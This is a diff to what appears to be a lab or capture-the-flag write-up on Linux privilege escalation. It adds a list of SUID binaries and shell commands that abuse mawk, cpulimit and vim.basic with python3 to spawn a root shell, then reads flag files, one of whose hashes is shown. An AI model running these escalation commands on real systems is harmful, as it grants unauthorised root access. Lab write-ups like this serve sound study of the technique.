@@ -45,3 +45,31 @@ whoami
 root
 cd /root
 cat proof.txt     // 2de56538e38a8637964f01fb5da2b690
+
+id 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/traceroute6.iputils
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/newgidmap
+/usr/bin/vim.basic
+/usr/bin/newuidmap
+
+./mawk 'BEGIN {system("/bin/sh")}'          <!-- aparently it only get's the bash for the same user-->
+./cpulimit -l 100 -f -- /bin/sh -p 
+whoami
+root
+cd /root
+cat local.txt
+
+We already got a SUID on gtfobins with VIM.
+Just make sure you change the name and which python is being executed, in our case python3
+
+/usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
